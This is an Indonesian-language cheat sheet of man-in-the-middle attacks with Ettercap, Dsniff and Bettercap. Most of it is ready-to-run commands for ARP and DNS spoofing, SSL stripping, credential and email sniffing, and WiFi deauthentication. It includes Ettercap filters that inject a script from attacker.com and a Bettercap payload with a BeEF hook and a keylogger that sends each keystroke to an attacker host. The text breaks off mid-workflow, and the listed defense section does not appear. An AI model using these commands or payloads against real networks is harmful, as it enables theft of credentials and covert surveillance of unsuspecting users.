# 🎭 Man-in-the-Middle (MITM) Attack Cheat Sheet

## 📑 Daftar Isi
1. [Pengenalan MITM Attack](#pengenalan-mitm-attack)
2. [Ettercap](#ettercap)
3. [Dsniff](#dsniff)
4. [Bettercap](#bettercap)
5. [Perbandingan Tools](#perbandingan-tools)
6. [Defense & Mitigation](#defense--mitigation)

---

## 🎯 Pengenalan MITM Attack

### Apa itu Man-in-the-Middle (MITM)?

MITM adalah serangan di mana attacker menempatkan dirinya **di antara** dua pihak yang berkomunikasi, sehingga dapat:
- **Menyadap** (intercept) komunikasi
- **Memodifikasi** data yang dikirim
- **Menyuntikkan** payload berbahaya
- **Mencuri** kredensial dan data sensitif

### Teknik MITM Umum

#### 1. **ARP Spoofing/Poisoning**
```
Normal:
Client -----> Router -----> Internet

MITM Attack:
Client -----> Attacker -----> Router -----> Internet
       (fake ARP)      (fake ARP)
```

**Cara Kerja:**
1. Attacker mengirim **fake ARP reply** ke victim
2. Victim menyimpan MAC address attacker sebagai gateway
3. Traffic victim dialihkan melalui attacker
4. Attacker forward traffic ke router (transparent)

#### 2. **DNS Spoofing**
- Memodifikasi DNS response
- Redirect victim ke fake website
- Phishing credential

#### 3. **DHCP Spoofing**
- Menjadi rogue DHCP server
- Memberikan fake gateway address
- Mengarahkan semua traffic melalui attacker

#### 4. **SSL Stripping**
- Downgrade HTTPS ke HTTP
- Victim mengira masih aman
- Attacker dapat membaca plaintext

---

## 🦊 Ettercap

### Overview
Ettercap adalah comprehensive suite untuk MITM attacks di LAN. Mendukung:
- Active & passive dissection protocols
- Network & host analysis
- Packet filtering/dropping
- Plugin support

### Instalasi

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install ettercap-graphical ettercap-text-only

# Fedora/RHEL
sudo dnf install ettercap

# Arch Linux
sudo pacman -S ettercap

# macOS
brew install ettercap

# Check version
ettercap --version
```

---

### Konfigurasi

#### **Edit Configuration File**
```bash
# Edit ettercap config
sudo nano /etc/ettercap/etter.conf

# Atau di home directory
sudo nano /usr/share/ettercap/etter.conf
```

#### **Important Settings:**
```ini
# Uncomment untuk IP forwarding
[privs]
ec_uid = 65534        # nobody user
ec_gid = 65534        # nobody group

# Linux IP forwarding
[mitm]
# Uncomment this:
#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
```

#### **Enable IP Forwarding**
```bash
# Temporary (sampai reboot)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Permanent
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p

# Verify
cat /proc/sys/net/ipv4/ip_forward  # Should return 1
```

---

### Command Line Interface

#### **Basic Syntax**
```bash
ettercap [OPTIONS] [TARGET1] [TARGET2]
```

#### **Common Options**

| Option | Deskripsi |
|--------|-----------|
| `-T` | Text mode interface |
| `-C` | Curses interface (interactive) |
| `-G` | GTK GUI interface |
| `-i <interface>` | Network interface |
| `-M <method>` | MITM method (arp, icmp, dhcp, port) |
| `-w <file>` | Write pcap file |
| `-r <file>` | Read pcap file |
| `-q` | Quiet mode |
| `-s` | Script mode |
| `-P <plugin>` | Load plugin |
| `-F <filter>` | Load filter file |

---

### Target Specification

```bash
# Target format: MAC/IP/IPv6/PORT

# Examples:
/192.168.1.100/          # Single IP
/192.168.1.1-50/         # IP range
/192.168.1.0/24/         # Subnet
//80                     # Port 80 all hosts
/192.168.1.100/80,443    # Specific IP and ports
```

---

### MITM Methods

#### **1. ARP Spoofing**
```bash
# Basic ARP poisoning
sudo ettercap -T -M arp:remote /192.168.1.100/ /192.168.1.1/
#                        ^          ^              ^
#                        |          |              |
#                     method    target1         target2
#                              (victim)        (gateway)

# Explanation:
# - Target1: Victim's IP (client)
# - Target2: Gateway/Router IP
# - arp:remote = Full duplex ARP poisoning
```

**ARP Modes:**
- `arp:remote` - Poison victim dan gateway (full duplex)
- `arp:oneway` - Poison hanya victim (one way)

#### **2. ICMP Redirect**
```bash
# ICMP redirect attack
sudo ettercap -T -M icmp:MAC/IP /192.168.1.100/ /192.168.1.1/
```

#### **3. DHCP Spoofing**
```bash
# Become rogue DHCP server
sudo ettercap -T -M dhcp:ip_pool,netmask,dns /
```

#### **4. Port Stealing**
```bash
# Port stealing attack (switch environment)
sudo ettercap -T -M port /192.168.1.100/ /192.168.1.1/
```

---

### Praktik Ettercap

#### **Scenario 1: Basic Sniffing**
```bash
# Sniff semua traffic di network
sudo ettercap -T -i eth0

# Sniff dengan menyimpan ke file
sudo ettercap -T -i eth0 -w capture.pcap

# Sniff hanya HTTP traffic
sudo ettercap -T -i eth0 -L capture
```

#### **Scenario 2: ARP Poisoning Single Target**
```bash
# Victim: 192.168.1.100
# Gateway: 192.168.1.1

sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/

# Dengan logging
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/ -w mitm.pcap
```

#### **Scenario 3: ARP Poisoning Multiple Targets**
```bash
# Semua device di subnet
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.0/24/ /192.168.1.1/

# Range IP tertentu
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.10-50/ /192.168.1.1/
```

#### **Scenario 4: Credential Harvesting**
```bash
# Capture passwords (FTP, HTTP, Telnet, dll)
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/ -q

# Ettercap akan otomatis dissect credentials
```

#### **Scenario 5: dengan Plugin**
```bash
# List available plugins
ettercap -P list

# DNS spoof dengan plugin
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/ -P dns_spoof

# Multiple plugins
sudo ettercap -T -i eth0 -M arp:remote // // -P dns_spoof -P repoison_arp
```

---

### Plugins

#### **Built-in Plugins**

| Plugin | Deskripsi |
|--------|-----------|
| `dns_spoof` | DNS spoofing attack |
| `arp_cop` | ARP poisoning detection & prevention |
| `autoadd` | Auto add new hosts to targets |
| `chk_poison` | Check if ARP poisoning is successful |
| `dos_attack` | DoS attack menggunakan malformed packets |
| `dump_https` | Dump HTTPS packets |
| `find_conn` | Find connection matching regex |
| `find_ettercap` | Detect other Ettercap instances |
| `find_ip` | Find IP address in packets |
| `gre_relay` | GRE tunneling relay |
| `gw_discover` | Gateway discovery |
| `isolate` | Isolate host dari network |
| `link_type` | Check link type (wifi, ethernet) |
| `pptp_chapms1` | Crack PPTP CHAP MS v1 |
| `pptp_clear` | Force PPTP cleartext tunneling |
| `pptp_pap` | Force PPTP to use PAP authentication |
| `pptp_reneg` | Force PPTP re-negotiation |
| `rand_flood` | Random MAC flooding |
| `remote_browser` | Remote browser command execution |
| `repoison_arp` | Re-poison ARP cache periodically |
| `reply_arp` | Reply to ARP requests |
| `scan_poisoner` | Scan for ARP poisoners |
| `search_promisc` | Search for promiscuous mode NICs |
| `smb_clear` | Force SMB cleartext authentication |
| `smb_down` | SMB downgrade attack |
| `stp_mangler` | STP mangling for MITM in switched env |

#### **Plugin Usage**
```bash
# DNS Spoofing
sudo ettercap -T -i eth0 -M arp:remote // // -P dns_spoof

# Configure DNS spoof targets
sudo nano /etc/ettercap/etter.dns

# Add entries:
# example.com A 192.168.1.50
# *.facebook.com A 192.168.1.50

# Isolate target dari network
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/ -P isolate

# SMB cleartext downgrade
sudo ettercap -T -i eth0 -M arp:remote // // -P smb_clear
```

---

### Filters

Ettercap filters memungkinkan modify/drop packets on-the-fly.

#### **Filter Syntax**
```c
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish!");
        msg("Content-Encoding stripped\n");
    }
}
```

#### **Compile Filter**
```bash
# Compile filter
etterfilter filter.ecf -o filter.ef

# Use filter
sudo ettercap -T -i eth0 -M arp:remote // // -F filter.ef
```

#### **Example Filters**

**1. Strip Encoding (untuk SSL Strip)**
```c
# strip_encoding.ecf
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Nothing!");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "Content-Encoding")) {
        replace("Content-Encoding", "Content-Nothing!");
    }
}
```

**2. Replace Images**
```c
# replace_images.ecf
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "GET")) {
        replace("GET", "GET");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "image/jpeg")) {
        replace("image/jpeg", "text/html ");
        msg("Image replaced!\n");
    }
}
```

**3. Inject JavaScript**
```c
# inject_js.ecf
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "</body>")) {
        replace("</body>", "<script src='http://attacker.com/hook.js'></script></body>");
        msg("JavaScript injected!\n");
    }
}
```

**4. Drop Packets**
```c
# drop_packets.ecf
if (ip.proto == TCP && tcp.dst == 443) {
    drop();
    kill();
    msg("HTTPS packet dropped\n");
}
```

---

### GUI Mode

```bash
# Start GUI
sudo ettercap -G

# Steps:
# 1. Sniff → Unified sniffing → Select interface
# 2. Hosts → Scan for hosts
# 3. Hosts → Hosts list
# 4. Select target 1 → Add to Target 1
# 5. Select target 2 → Add to Target 2
# 6. MITM → ARP poisoning → Sniff remote connections
# 7. Start → Start sniffing
```

---

### Curses Interface

```bash
# Start curses interface
sudo ettercap -C

# Navigation:
# h - Help
# q - Quit
# SPACE - Select
# Enter - Confirm
```

---

### Log Files

```bash
# Ettercap saves logs to:
/var/log/ettercap/

# Log format:
ettercap_<interface>_<timestamp>.log

# View logs
tail -f /var/log/ettercap/ettercap.log

# Custom log location
sudo ettercap -T -i eth0 -M arp:remote // // -L /tmp/mylog
```

---

### Advanced Techniques

#### **1. SSL Strip Attack**
```bash
# Terminal 1: Run sslstrip
sudo sslstrip -l 8080 -w sslstrip.log

# Terminal 2: Run ettercap dengan redirect
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/
```

#### **2. DNS Spoofing**
```bash
# Edit DNS spoof file
sudo nano /etc/ettercap/etter.dns

# Add entries:
*.facebook.com A 192.168.1.50
google.com A 192.168.1.50

# Run with DNS spoof plugin
sudo ettercap -T -i eth0 -M arp:remote // // -P dns_spoof
```

#### **3. Capture dan Crack Passwords**
```bash
# Capture dengan ettercap
sudo ettercap -T -i eth0 -M arp:remote // // -w passwords.pcap

# Extract dengan ettercap
etterlog -p passwords.pcap > passwords.txt

# Atau gunakan wireshark/tshark
tshark -r passwords.pcap -Y "http.request.method == POST" -T fields -e http.file_data
```

---

## 🔧 Dsniff

### Overview
Dsniff adalah collection of tools untuk network auditing dan penetration testing. Suite includes:
- `dsniff` - Password sniffer
- `arpspoof` - ARP spoofing tool
- `dnsspoof` - DNS spoofing tool
- `filesnarf` - NFS file sniffing
- `macof` - MAC flooding tool
- `mailsnarf` - Email sniffing
- `msgsnarf` - Chat/IM sniffing
- `sshmitm` - SSH MITM attack
- `tcpkill` - Kill TCP connections
- `tcpnice` - Slow down TCP connections
- `urlsnarf` - URL sniffing
- `webmitm` - HTTP/HTTPS MITM proxy
- `webspy` - Show victim's web browsing

### Instalasi

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install dsniff

# Fedora (dari repo tambahan)
sudo dnf install dsniff

# Arch Linux (dari AUR)
yay -S dsniff

# macOS
brew install dsniff

# Verify
dsniff -h
```

---

### 1. dsniff (Password Sniffer)

Sniff passwords dari berbagai protokol.

#### **Supported Protocols**
- FTP
- Telnet
- SMTP
- HTTP (Basic Auth)
- POP3
- IMAP
- NNTP
- NFS
- SOCKS
- LDAP
- SNMP
- Microsoft SQL
- Oracle SQL
- PostgreSQL
- Citrix ICA
- CVS
- ICQ, AIM, MSN
- SOCKS

#### **Usage**
```bash
# Basic sniffing
sudo dsniff -i eth0

# Sniff specific interface dengan verbose
sudo dsniff -i eth0 -v

# Sniff specific network/host
sudo dsniff -i eth0 -n

# Read from pcap file
dsniff -r capture.pcap

# Output to file
sudo dsniff -i eth0 -w passwords.txt
sudo dsniff -i eth0 > passwords.txt

# Show only specific protocols
sudo dsniff -i eth0 | grep -E "FTP|TELNET"
```

#### **Example Output**
```
12/01/26 10:30:45 tcp 192.168.1.100.54321 -> 192.168.1.1.21 (ftp)
USER admin
PASS SecretPassword123

12/01/26 10:31:12 tcp 192.168.1.100.54322 -> 192.168.1.50.23 (telnet)
USER root
PASS RootPass456
```

---

### 2. arpspoof (ARP Spoofing)

#### **Syntax**
```bash
arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
```

#### **Options**

| Option | Deskripsi |
|--------|-----------|
| `-i` | Network interface |
| `-c` | Restore ARP configuration on exit |
| `-t` | Target host (victim) |
| `-r` | Poison both directions (bidirectional) |

#### **Usage**

**Setup:**
```bash
# Enable IP forwarding FIRST!
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

**Basic ARP Spoofing:**
```bash
# Spoof victim agar percaya kita adalah gateway
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 2: Spoof gateway agar percaya kita adalah victim (bidirectional)
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

**Simplified dengan -r:**
```bash
# Automatic bidirectional spoofing
sudo arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1
```

**Complete MITM Attack:**
```bash
# Terminal 1: Enable forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Terminal 2: ARP spoof (victim -> gateway)
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 3: ARP spoof (gateway -> victim)
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Terminal 4: Capture traffic
sudo tcpdump -i eth0 -w mitm.pcap

# Atau gunakan dsniff untuk sniff passwords
sudo dsniff -i eth0
```

---

### 3. dnsspoof (DNS Spoofing)

Forge DNS responses.

#### **Syntax**
```bash
dnsspoof [-i interface] [-f hostsfile] [expression]
```

#### **Configuration**

Create hosts file:
```bash
# Create fake DNS entries
sudo nano /etc/dnsspoof.hosts

# Add entries:
192.168.1.50 www.facebook.com
192.168.1.50 facebook.com
192.168.1.50 *.google.com
192.168.1.50 www.bank.com
```

#### **Usage**
```bash
# Basic DNS spoofing
sudo dnsspoof -i eth0

# With custom hosts file
sudo dnsspoof -i eth0 -f /etc/dnsspoof.hosts

# Spoof specific domain
sudo dnsspoof -i eth0 host www.example.com

# Combined dengan ARP spoofing
# Terminal 1: ARP spoof
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 2: DNS spoof
sudo dnsspoof -i eth0 -f /etc/dnsspoof.hosts
```

---

### 4. urlsnarf (URL Sniffing)

Capture URLs from HTTP traffic.

#### **Usage**
```bash
# Sniff URLs
sudo urlsnarf -i eth0

# Verbose mode
sudo urlsnarf -i eth0 -v

# Read from pcap
urlsnarf -r capture.pcap

# Output to file
sudo urlsnarf -i eth0 > urls.txt
```

#### **Example Output**
```
192.168.1.100 - - [12/Jan/2026:10:30:45 +0700] "GET http://www.example.com/login.php HTTP/1.1" - - "Mozilla/5.0"
192.168.1.100 - - [12/Jan/2026:10:30:46 +0700] "POST http://www.example.com/auth.php HTTP/1.1" - - "Mozilla/5.0"
```

---

### 5. webmitm (HTTP/HTTPS MITM Proxy)

MITM proxy untuk HTTP/HTTPS dengan SSL downgrade.

#### **Usage**
```bash
# Basic webmitm
sudo webmitm -d

# Debug mode
sudo webmitm -d -p

# Combined dengan ARP spoofing
# Terminal 1: ARP spoof
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 2: Redirect traffic to webmitm
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

# Terminal 3: Run webmitm
sudo webmitm -d
```

---

### 6. sshmitm (SSH MITM)

MITM attack untuk SSH connections.

#### **Usage**
```bash
# Run SSH MITM proxy
sudo sshmitm -d -I

# Combined dengan ARP spoofing
# Terminal 1: ARP spoof
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 2: Redirect SSH traffic
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222

# Terminal 3: Run sshmitm
sudo sshmitm -d -p 2222
```

---

### 7. mailsnarf (Email Sniffing)

Sniff email messages dari POP3, SMTP, IMAP.

#### **Usage**
```bash
# Sniff emails
sudo mailsnarf -i eth0

# Verbose mode
sudo mailsnarf -i eth0 -v

# Read from pcap
mailsnarf -r capture.pcap

# Output to file
sudo mailsnarf -i eth0 > emails.txt
```

---

### 8. msgsnarf (IM/Chat Sniffing)

Sniff instant messaging conversations.

**Supported:**
- AIM
- ICQ
- MSN Messenger
- Yahoo Messenger
- IRC

#### **Usage**
```bash
# Sniff IM messages
sudo msgsnarf -i eth0

# Read from pcap
msgsnarf -r capture.pcap
```

---

### 9. filesnarf (NFS File Sniffing)

Sniff files dari NFS traffic.

#### **Usage**
```bash
# Sniff NFS files
sudo filesnarf -i eth0

# Save to directory
sudo filesnarf -i eth0 -d /tmp/nfs_files/
```

---

### 10. macof (MAC Flooding)

Flood switch's CAM table dengan random MAC addresses.

#### **Purpose**
- Overwhelm switch CAM table
- Force switch into "hub mode" (broadcast semua traffic)
- Membuat passive sniffing possible di switched network

#### **Usage**
```bash
# Basic MAC flooding
sudo macof -i eth0

# Specify number of packets
sudo macof -i eth0 -n 1000

# Continuous flooding dengan rate limit
sudo macof -i eth0 -s 192.168.1.50 -d 192.168.1.100
```

⚠️ **Warning:** Ini dapat menyebabkan network disruption!

---

### 11. tcpkill (Kill TCP Connections)

Terminate TCP connections.

#### **Usage**
```bash
# Kill connection ke specific host
sudo tcpkill -i eth0 host 192.168.1.100

# Kill connection ke specific port
sudo tcpkill -i eth0 port 80

# Kill SSH connections
sudo tcpkill -i eth0 port 22

# Kill dengan expression
sudo tcpkill -i eth0 "host 192.168.1.100 and port 80"
```

---

### 12. tcpnice (Slow Down Connections)

Slow down TCP connections.

#### **Usage**
```bash
# Slow down connection
sudo tcpnice -i eth0 host 192.168.1.100

# Slow down specific port
sudo tcpnice -i eth0 port 80
```

---

### 13. webspy (Web Browsing Spy)

Show URLs that victim is browsing in real-time di YOUR browser.

#### **Usage**
```bash
# Spy on victim's browsing
sudo webspy -i eth0 192.168.1.100
```

---

### Complete MITM Attack dengan Dsniff Suite

#### **Scenario: Capture Credentials**

```bash
# Step 1: Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Step 2: Start ARP spoofing (Terminal 1)
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Step 3: Start ARP spoofing reverse (Terminal 2)
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Step 4: Capture credentials (Terminal 3)
sudo dsniff -i eth0

# Step 5: Capture URLs (Terminal 4 - optional)
sudo urlsnarf -i eth0 > urls.txt

# Step 6: Capture emails (Terminal 5 - optional)
sudo mailsnarf -i eth0 > emails.txt
```

#### **Scenario: DNS Spoofing Attack**

```bash
# Step 1: Create fake DNS entries
echo "192.168.1.50 www.facebook.com" | sudo tee /etc/dnsspoof.hosts
echo "192.168.1.50 facebook.com" | sudo tee -a /etc/dnsspoof.hosts

# Step 2: Setup fake web server
cd /var/www/html
sudo python3 -m http.server 80

# Step 3: Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Step 4: ARP spoof (Terminal 1)
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Step 5: DNS spoof (Terminal 2)
sudo dnsspoof -i eth0 -f /etc/dnsspoof.hosts
```

---

## 🚀 Bettercap

### Overview
Bettercap adalah **modern**, **powerful**, dan **modular** framework untuk network reconnaissance dan MITM attacks. Dibuat sebagai pengganti ettercap dengan fitur lebih advanced.

**Features:**
- Real-time network monitoring
- Modular architecture
- Built-in web UI
- API server
- Scripting support (caplets)
- Multiple protocols support
- Active development

### Instalasi

#### **Method 1: Package Manager**
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install bettercap

# Arch Linux
sudo pacman -S bettercap

# macOS
brew install bettercap
```

#### **Method 2: From Source**
```bash
# Install Go first
sudo apt install golang-go

# Install bettercap
go install github.com/bettercap/bettercap@latest

# Add to PATH
echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc
source ~/.bashrc

# Verify
bettercap --version
```

#### **Method 3: Binary Release**
```bash
# Download dari GitHub releases
wget https://github.com/bettercap/bettercap/releases/download/v2.32.0/bettercap_linux_amd64_v2.32.0.zip

# Extract
unzip bettercap_linux_amd64_v2.32.0.zip

# Make executable
chmod +x bettercap

# Move to PATH
sudo mv bettercap /usr/local/bin/
```

---

### Basic Usage

#### **Start Bettercap**
```bash
# Interactive mode
sudo bettercap

# Specify interface
sudo bettercap -iface eth0

# Start with web UI
sudo bettercap -iface eth0 -caplet http-ui

# Run caplet (script)
sudo bettercap -iface eth0 -caplet mycaplet.cap

# Eval commands directly
sudo bettercap -iface eth0 -eval "net.probe on; net.show"
```

---

### Interactive Commands

Bettercap menggunakan interactive shell dengan modules.

#### **Help Commands**
```bash
# Show help
» help

# Help untuk module tertentu
» help net.probe

# Show all modules
» help modules

# Active modules
» active
```

#### **Network Discovery**
```bash
# Start network probing
» net.probe on

# Show discovered hosts
» net.show

# Show dengan details
» net.show | sort

# Recon specific target
» net.recon 192.168.1.100

# Clear hosts
» net.clear

# Show gateway
» gateway

# Show router
» router
```

---

### Modules

#### **1. net.probe (Network Discovery)**
```bash
# Start probing
» net.probe on

# Stop probing
» net.probe off

# Set probe throttle (ms)
» set net.probe.throttle 100

# Show targets
» net.show
```

---

#### **2. net.recon (Host Reconnaissance)**
```bash
# Enable recon
» net.recon on

# Recon specific host
» net.recon 192.168.1.100

# Disable recon
» net.recon off
```

---

#### **3. arp.spoof (ARP Spoofing)**

**Commands:**
```bash
# Set target (victim)
» set arp.spoof.targets 192.168.1.100

# Set multiple targets
» set arp.spoof.targets 192.168.1.100,192.168.1.101,192.168.1.102

# Set target subnet
» set arp.spoof.targets 192.168.1.0/24

# Spoof entire network (careful!)
» set arp.spoof.targets *

# Enable full duplex (spoof victim dan gateway)
» set arp.spoof.fullduplex true

# Enable IP forwarding (internal)
» set arp.spoof.internal true

# Start ARP spoofing
» arp.spoof on

# Stop ARP spoofing
» arp.spoof off

# Ban target (DoS - drop semua packets)
» arp.ban on
```

**Example MITM Attack:**
```bash
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

#### **4. net.sniff (Packet Sniffing)**

**Commands:**
```bash
# Start sniffing
» net.sniff on

# Stop sniffing
» net.sniff off

# Set output file
» set net.sniff.output /tmp/capture.pcap

# Show stats
» net.sniff.stats

# Filter specific protocol
» set net.sniff.filter "tcp port 80"

# Verbose sniffing
» set net.sniff.verbose true

# Sniff local traffic too
» set net.sniff.local true

# Sniff regex filter
» set net.sniff.regexp '.*password.*'
```

**Supported Protocols:**
- HTTP
- HTTPS (dengan SSLSTRIP)
- FTP
- Telnet
- SMTP
- POP3
- IMAP
- MySQL
- NTLM
- Kerberos
- SNMP
- Redis
- IRC
- Custom regex

---

#### **5. http.proxy (HTTP Proxy)**

Transparent HTTP proxy untuk inject/modify traffic.

**Commands:**
```bash
# Start HTTP proxy
» http.proxy on

# Stop HTTP proxy
» http.proxy off

# Set port (default: 8080)
» set http.proxy.port 8080

# SSL stripping
» set http.proxy.sslstrip true

# Inject JavaScript
» set http.proxy.script /path/to/inject.js

# Proxy stats
» http.proxy.stats
```

**Example - Inject JS:**
```bash
# Create inject script
echo "alert('HACKED!');" > /tmp/inject.js

# Setup
» set http.proxy.script /tmp/inject.js
» http.proxy on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

---

#### **6. https.proxy (HTTPS Proxy)**

HTTPS proxy dengan SSL stripping/mitm.

**Commands:**
```bash
# Start HTTPS proxy
» https.proxy on

# Set port
» set https.proxy.port 8083

# Set certificate
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem

# Strip SSL
» set https.proxy.sslstrip true

# Inject script
» set https.proxy.script /tmp/inject.js
```

---

#### **7. dns.spoof (DNS Spoofing)**

**Commands:**
```bash
# Enable DNS spoofing
» dns.spoof on

# Spoof specific domain
» set dns.spoof.domains example.com,*.facebook.com

# Spoof to specific IP
» set dns.spoof.address 192.168.1.50

# Spoof all domains
» set dns.spoof.all true

# Stop DNS spoofing
» dns.spoof off
```

**Example:**
```bash
» set dns.spoof.domains facebook.com,*.facebook.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

---

#### **8. dhcp6.spoof (DHCPv6 Spoofing)**

Spoof DHCPv6 untuk IPv6 MITM.

```bash
» dhcp6.spoof on
» set dhcp6.spoof.domains example.com
» dhcp6.spoof off
```

---

#### **9. ble.* (Bluetooth Low Energy)**

```bash
# Recon BLE devices
» ble.recon on

# Show BLE devices
» ble.show

# Enumerate BLE device
» ble.enum MAC_ADDRESS

# Write to BLE characteristic
» ble.write MAC_ADDRESS HANDLE VALUE
```

---

#### **10. wifi.* (WiFi Attacks)**

```bash
# Recon WiFi networks
» wifi.recon on

# Show WiFi APs
» wifi.show

# Deauth attack
» wifi.deauth AP_MAC

# Handshake capture
» set wifi.handshakes.file /tmp/handshakes.pcap
» wifi.recon on
» wifi.deauth AP_MAC
```

---

#### **11. caplets (Scripts)**

Caplets adalah bettercap scripts untuk automate tasks.

**List available caplets:**
```bash
» caplets.show

# Update caplets
» caplets.update
```

**Run caplet:**
```bash
# From bettercap shell
» caplets.run http-ui

# Or from command line
sudo bettercap -caplet http-ui
```

**Popular Caplets:**
- `http-ui` - Web-based UI
- `https-ui` - HTTPS web UI
- `mitm` - Full MITM attack
- `netmon` - Network monitoring
- `rest-api` - REST API server
- `beef-active` - BeEF integration
- `download-autopwn` - Auto download/analyze files

---

### Creating Custom Caplets

#### **Example 1: Simple MITM**
```bash
# Save as mitm.cap
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true

arp.spoof on
net.sniff on

set net.sniff.verbose true
set net.sniff.output /tmp/mitm.pcap
```

**Run:**
```bash
sudo bettercap -iface eth0 -caplet mitm.cap
```

---

#### **Example 2: DNS Spoof + ARP Spoof**
```bash
# Save as dns_mitm.cap
# Enable network discovery
net.probe on

# DNS spoofing
set dns.spoof.domains facebook.com,*.facebook.com,google.com
set dns.spoof.address 192.168.1.50
dns.spoof on

# ARP spoofing
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.fullduplex true
arp.spoof on

# Sniffing
net.sniff on
set net.sniff.verbose true
```

---

#### **Example 3: Credential Harvester**
```bash
# Save as creds.cap
# Network discovery
net.probe on
sleep 5

# ARP spoofing entire subnet
set arp.spoof.targets *
set arp.spoof.fullduplex true
arp.spoof on

# Sniff credentials
net.sniff on
set net.sniff.verbose true
set net.sniff.output /tmp/credentials.pcap

# HTTP proxy for injection
http.proxy on
set http.proxy.sslstrip true

# Show events
events.stream on
```

---

#### **Example 4: Advanced JS Injection**
```bash
# Create inject.js
cat > /tmp/inject.js << 'EOF'
// BeEF Hook
var script = document.createElement('script');
script.src = 'http://192.168.1.50:3000/hook.js';
document.body.appendChild(script);

// Keylogger
document.addEventListener('keypress', function(e) {
    fetch('http://192.168.1.50:8000/log?key=' + e.key);
});
EOF

# Create caplet (inject.cap)
cat > inject.cap << 'EOF'
set http.proxy.script /tmp/inject.js
http.proxy on

set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on

net.sniff on
EOF

# Run
sudo bettercap -caplet inject.cap
```

---

### Web UI

Bettercap memiliki web-based UI yang powerful.

#### **Start Web UI:**
```bash
# Method 1: From shell
sudo bettercap
» caplets.update
» http-ui

# Method 2: Command line
sudo bettercap -caplet http-ui

# Access
# http://127.0.0.1:80
# Default credentials:
# Username: bettercap
# Password: bettercap
```

#### **Features:**
- Real-time network map
- Host discovery
- Attack modules (ARP, DNS, proxy, etc)
- Packet capture
- Events log
- Graph visualization
- Module management

---

### REST API

Bettercap provides REST API for automation.

#### **Start API Server:**
```bash
» api.rest on

# Custom port
» set api.rest.port 8081

# Set credentials
» set api.rest.username admin
» set api.rest.password MySecretPass123
```

#### **API Endpoints:**
```bash
# Get session info
curl -k https://127.0.0.1:8083/api/session

# Start module
curl -k -X POST https://127.0.0.1:8083/api/session \
  -u admin:pass \
  -d '{"cmd":"arp.spoof on"}'

# Get events
curl -k https://127.0.0.1:8083/api/events \
  -u admin:pass
```

---

### Events & Logging

#### **Event Stream:**
```bash
# Show all events real-time
» events.stream on

# Filter events
» set events.stream.filter "net.sniff"

# Clear events
» events.clear

# Ignore events
» set events.ignore.list "wifi.ap.new,ble.device.new"
```

#### **Logging:**
```bash
# Set log file
» set log.file /tmp/bettercap.log

# Log level (DEBUG, INFO, WARNING, ERROR, FATAL)
» set log.level INFO

# Enable logging
» log on
```

---

### Advanced Techniques

#### **1. Full MITM Attack Workflow**
```bash
# Start bettercap
sudo bettercap -iface eth0

# Discovery
» net.probe on
» sleep 5
» net.show

# Select target
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true

# Enable modules
» net.sniff on
» set net.sniff.verbose true
» set net.sniff.output /tmp/capture.pcap

» http.proxy on
» set http.proxy.sslstrip true

